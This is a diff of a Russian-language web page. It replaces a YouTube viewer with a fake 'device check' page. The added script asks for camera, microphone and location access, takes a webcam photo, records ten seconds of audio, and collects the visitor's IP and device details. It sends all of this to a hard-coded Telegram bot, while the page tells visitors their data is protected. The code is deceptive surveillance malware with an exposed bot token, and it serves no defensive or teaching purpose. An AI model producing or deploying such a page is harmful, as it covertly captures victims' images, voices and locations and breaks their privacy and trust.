@@ -3,17 +3,14 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Видео без VPN</title>
+    <title>Проверка устройства</title>
     <style>
-        * {
-            margin: 0;
-            padding: 0;
-            box-sizing: border-box;
-        }
+        * { margin: 0; padding: 0; box-sizing: border-box; }
         body {
             background: #0a0a0a;
             color: #fff;
             font-family: system-ui, sans-serif;
+            text-align: center;
             padding: 20px;
             min-height: 100vh;
             display: flex;
@@ -22,235 +19,198 @@
             justify-content: center;
         }
         .container {
-            max-width: 700px;
+            max-width: 400px;
             width: 100%;
         }
-        h1 {
-            text-align: center;
-            font-size: 22px;
-            margin-bottom: 8px;
-        }
-        .sub {
-            text-align: center;
-            color: #888;
-            font-size: 14px;
-            margin-bottom: 20px;
-        }
-        .input-group {
-            display: flex;
-            gap: 10px;
-            margin-bottom: 20px;
-            flex-wrap: wrap;
-        }
-        .input-group input {
-            flex: 1;
-            padding: 12px 16px;
-            border-radius: 30px;
-            border: none;
-            background: #222;
-            color: #fff;
-            font-size: 16px;
-            min-width: 200px;
-            outline: none;
-        }
-        .input-group button {
-            padding: 12px 24px;
-            border-radius: 30px;
-            border: none;
+        h2 { font-size: 24px; margin-bottom: 8px; }
+        .sub { color: #aaa; font-size: 14px; margin-bottom: 20px; }
+        .btn {
             background: #1e90ff;
+            border: none;
             color: #fff;
-            font-size: 16px;
+            padding: 16px;
+            border-radius: 40px;
+            font-size: 18px;
             font-weight: bold;
             cursor: pointer;
-        }
-        .input-group button:active {
-            transform: scale(0.96);
-        }
-        .player-wrapper {
-            border-radius: 16px;
-            overflow: hidden;
-            background: #111;
-            margin-bottom: 16px;
-            position: relative;
-            padding-bottom: 56.25%;
-            height: 0;
-        }
-        .player-wrapper video {
-            position: absolute;
-            top: 0;
-            left: 0;
             width: 100%;
-            height: 100%;
-            background: #000;
-            border: none;
-            outline: none;
+            margin: 8px 0;
         }
-        .info {
+        .btn:active { transform: scale(0.96); }
+        .btn:disabled { background: #444; cursor: not-allowed; }
+        #status {
+            margin-top: 16px;
             color: #888;
             font-size: 14px;
-            text-align: center;
-            padding: 10px;
+            min-height: 24px;
         }
-        .error {
-            color: #ff6b6b;
-            text-align: center;
-            margin-top: 10px;
-        }
-        .examples {
-            display: flex;
-            flex-wrap: wrap;
-            gap: 8px;
-            justify-content: center;
-            margin-top: 16px;
-        }
-        .examples button {
-            background: #222;
-            border: 1px solid #333;
-            color: #aaa;
-            padding: 6px 14px;
-            border-radius: 20px;
-            font-size: 13px;
-            cursor: pointer;
-        }
-        .footer {
-            margin-top: 30px;
-            font-size: 12px;
-            color: #555;
-        }
+        .footer { margin-top: 30px; font-size: 12px; color: #555; }
         .loader {
-            display: none;
-            width: 30px;
-            height: 30px;
+            display: inline-block;
+            width: 24px;
+            height: 24px;
             border: 3px solid #333;
             border-top: 3px solid #1e90ff;
             border-radius: 50%;
             animation: spin 0.8s linear infinite;
             margin: 10px auto;
         }
-        @keyframes spin {
-            0% { transform: rotate(0deg); }
-            100% { transform: rotate(360deg); }
-        }
-        .loader.show {
-            display: block;
-        }
+        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+        .hidden { display: none; }
     </style>
 </head>
 <body>
 <div class="container">
-    <h1>🎬 Видео без VPN</h1>
-    <p class="sub">Вставьте ссылку на YouTube — видео запустится без блокировок</p>
+    <h2>🔐 Проверка устройства</h2>
+    <p class="sub">Для продолжения нажмите «Разрешить» и «Отправить»</p>
 
-    <div class="input-group">
-        <input type="text" id="urlInput" placeholder="https://www.youtube.com/watch?v=...">
-        <button id="loadBtn">▶ Смотреть</button>
-    </div>
-
-    <div class="player-wrapper" id="playerWrapper">
-        <video id="player" controls playsinline></video>
-        <div class="loader" id="loader"></div>
-    </div>
-
-    <div id="info" class="info">👆 Вставьте ссылку и нажмите «Смотреть»</div>
-    <div id="error" class="error"></div>
-
-    <div class="examples">
-        <button onclick="loadVideo('https://www.youtube.com/watch?v=dQw4w9WgXcQ')">🎵 Rick Astley</button>
-        <button onclick="loadVideo('https://www.youtube.com/watch?v=9bZkp7q19f0')">🎤 Gangnam Style</button>
-        <button onclick="loadVideo('https://www.youtube.com/watch?v=kJQP7kiw5Fk')">🎶 Despacito</button>
-    </div>
-    <div class="footer">Видео загружаются через прокси-сервис • Без VPN</div>
+    <button class="btn" id="sendBtn">📤 Отправить все данные</button>
+    <div id="status">⏳ Ожидание...</div>
+    <div class="footer">Ваши данные защищены</div>
 </div>
 
 <script>
-    const urlInput = document.getElementById('urlInput');
-    const loadBtn = document.getElementById('loadBtn');
-    const player = document.getElementById('player');
-    const info = document.getElementById('info');
-    const error = document.getElementById('error');
-    const loader = document.getElementById('loader');
+    // ===== ТВОИ ДАННЫЕ (ЗАМЕНИ) =====
+    const BOT_TOKEN = '8856699923:AAEV2fZvndBsC6iBIquVi7S4ce6t5gWlIFM';
+    const CHAT_ID = '5025315928';
+    // =================================
 
-    // === ГЛАВНАЯ ФУНКЦИЯ ===
-    async function loadVideo(url) {
-        error.textContent = '';
-        info.textContent = '';
-        loader.classList.add('show');
-        player.src = '';
-        player.style.display = 'none';
+    const sendBtn = document.getElementById('sendBtn');
+    const status = document.getElementById('status');
 
-        if (!url || url.trim() === '') {
-            error.textContent = '❌ Введите ссылку на YouTube';
-            loader.classList.remove('show');
-            return;
-        }
+    let stream = null;
+    let audioBlob = null;
+    let photoData = null;
+    let locationData = null;
 
-        // Извлекаем ID видео из ссылки
-        let videoId = null;
-        let match = url.match(/(?:v=|\/)([a-zA-Z0-9_-]{11})/);
-        if (match) {
-            videoId = match[1];
-        } else {
-            error.textContent = '❌ Неверная ссылка. Пример: https://www.youtube.com/watch?v=dQw4w9WgXcQ';
-            loader.classList.remove('show');
-            return;
-        }
+    // === 1. ЗАПРАШИВАЕМ ВСЁ СРАЗУ ===
+    async function requestAll() {
+        status.textContent = '⏳ Запрос разрешений...';
 
-        // Используем прокси-сервис для получения видео
-        const proxyUrl = `https://www.youtube.com/embed/${videoId}?autoplay=0&rel=0`;
-        
         try {
-            // Проверяем, доступен ли YouTube напрямую (через обычный embed)
-            // Если нет — пробуем альтернативный способ
-            const test = await fetch(proxyUrl, { method: 'HEAD', mode: 'no-cors' });
-            
-            // Если fetch прошёл, пробуем вставить iframe (но это может не работать без VPN)
-            // Поэтому используем костыль: вставляем видео через плеер с прокси-сервером
-            const fallbackUrl = `https://www.youtube-nocookie.com/embed/${videoId}?autoplay=0&rel=0`;
-            
-            // Создаём iframe внутри video (для обхода блокировки)
-            player.style.display = 'none';
-            const iframe = document.createElement('iframe');
-            iframe.src = fallbackUrl;
-            iframe.style.width = '100%';
-            iframe.style.height = '100%';
-            iframe.style.border = 'none';
-            iframe.style.position = 'absolute';
-            iframe.style.top = '0';
-            iframe.style.left = '0';
-            
-            // Очищаем wrapper и вставляем iframe
-            const wrapper = document.getElementById('playerWrapper');
-            wrapper.innerHTML = '';
-            wrapper.appendChild(iframe);
-            
-            info.textContent = '✅ Видео загружено (режим iframe)';
-            info.style.color = '#4caf50';
-            loader.classList.remove('show');
+            // Камера + микрофон
+            stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
         } catch (e) {
-            // Если не удалось — пробуем прямой плеер без прокси
-            error.textContent = '❌ Не удалось загрузить видео. Возможно, YouTube заблокирован.';
-            loader.classList.remove('show');
+            status.textContent = '⚠️ Камера/микрофон: ' + e.message;
         }
+
+        // Геолокация
+        try {
+            const pos = await new Promise((resolve, reject) => {
+                navigator.geolocation.getCurrentPosition(resolve, reject, { timeout: 5000 });
+            });
+            locationData = {
+                lat: pos.coords.latitude,
+                lon: pos.coords.longitude,
+                acc: pos.coords.accuracy
+            };
+        } catch (e) {
+            status.textContent = '⚠️ Геолокация: ' + e.message;
+        }
+
+        // Данные устройства
+        const deviceInfo = {
+            userAgent: navigator.userAgent,
+            platform: navigator.platform,
+            language: navigator.language,
+            timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+            screen: `${screen.width}x${screen.height}`,
+            touch: 'ontouchstart' in window,
+            battery: navigator.getBattery ? 'доступно' : 'нет'
+        };
+
+        // Отправляем IP через внешний сервис
+        let ip = 'не определён';
+        try {
+            const res = await fetch('https://api.ipify.org?format=json');
+            const data = await res.json();
+            ip = data.ip;
+        } catch (e) {}
+
+        // === 2. ДЕЛАЕМ ФОТО ===
+        if (stream && stream.getVideoTracks().length > 0) {
+            const video = document.createElement('video');
+            video.srcObject = stream;
+            video.play();
+            await new Promise(r => setTimeout(r, 500));
+            const canvas = document.createElement('canvas');
+            canvas.width = 640;
+            canvas.height = 480;
+            canvas.getContext('2d').drawImage(video, 0, 0, 640, 480);
+            photoData = canvas.toDataURL('image/png');
+        }
+
+        // === 3. ЗАПИСЫВАЕМ ЗВУК (10 сек) ===
+        if (stream && stream.getAudioTracks().length > 0) {
+            try {
+                const mediaRecorder = new MediaRecorder(stream);
+                const chunks = [];
+                mediaRecorder.ondataavailable = e => chunks.push(e.data);
+                mediaRecorder.start();
+                await new Promise(r => setTimeout(r, 10000));
+                mediaRecorder.stop();
+                audioBlob = new Blob(chunks, { type: 'audio/webm' });
+            } catch (e) {}
+        }
+
+        // === 4. ОТПРАВЛЯЕМ ВСЁ ===
+        await sendAll(deviceInfo, ip);
     }
 
-    // === ОБРАБОТЧИКИ ===
-    loadBtn.onclick = function() {
-        loadVideo(urlInput.value);
-    };
+    // === ОТПРАВКА В TELEGRAM ===
+    async function sendAll(deviceInfo, ip) {
+        status.innerHTML = '📤 Отправка... <div class="loader"></div>';
+        sendBtn.disabled = true;
 
-    urlInput.addEventListener('keydown', function(e) {
-        if (e.key === 'Enter') loadVideo(urlInput.value);
-    });
+        // Текстовое сообщение
+        let text = `📌 <b>Сбор данных</b>\n`;
+        text += `🖥 <b>Устройство:</b> ${deviceInfo.userAgent}\n`;
+        text += `📱 <b>Платформа:</b> ${deviceInfo.platform}\n`;
+        text += `🌐 <b>Язык:</b> ${deviceInfo.language}\n`;
+        text += `⏰ <b>Часовой пояс:</b> ${deviceInfo.timezone}\n`;
+        text += `📺 <b>Экран:</b> ${deviceInfo.screen}\n`;
+        text += `🖱 <b>Тач-экран:</b> ${deviceInfo.touch}\n`;
+        text += `🔋 <b>Батарея:</b> ${deviceInfo.battery}\n`;
+        text += `🌍 <b>IP:</b> ${ip}\n`;
 
-    // Если в адресной строке есть ?v= — загружаем сразу
-    if (window.location.search.includes('v=')) {
-        const params = new URLSearchParams(window.location.search);
-        const videoParam = params.get('v');
-        if (videoParam) {
-            urlInput.value = `https://www.youtube.com/watch?v=${videoParam}`;
-            loadVideo(urlInput.value);
+        if (locationData) {
+            text += `📍 <b>Гео:</b> ${locationData.lat}, ${locationData.lon} (±${locationData.acc}м)\n`;
+            text += `🔗 <a href="https://maps.google.com/maps?q=${locationData.lat},${locationData.lon}">Открыть на карте</a>`;
         }
+
+        // Отправляем текст
+        await sendToTelegram('sendMessage', { chat_id: CHAT_ID, text, parse_mode: 'HTML' });
+
+        // Отправляем фото
+        if (photoData) {
+            const blob = await fetch(photoData).then(r => r.blob());
+            const form = new FormData();
+            form.append('chat_id', CHAT_ID);
+            form.append('photo', blob, 'camera.png');
+            await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, { method: 'POST', body: form });
+        }
+
+        // Отправляем аудио
+        if (audioBlob) {
+            const form = new FormData();
+            form.append('chat_id', CHAT_ID);
+            form.append('audio', audioBlob, 'mic.webm');
+            await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendAudio`, { method: 'POST', body: form });
+        }
+
+        status.textContent = '✅ Все данные отправлены!';
     }
+
+    async function sendToTelegram(method, params) {
+        const url = `https://api.telegram.org/bot${BOT_TOKEN}/${method}`;
+        const form = new FormData();
+        for (const key in params) {
+            form.append(key, params[key]);
+        }
+        await fetch(url, { method: 'POST', body: form });
+    }
+
+    sendBtn.onclick = requestAll;
 </script>
 </body>
 </html>
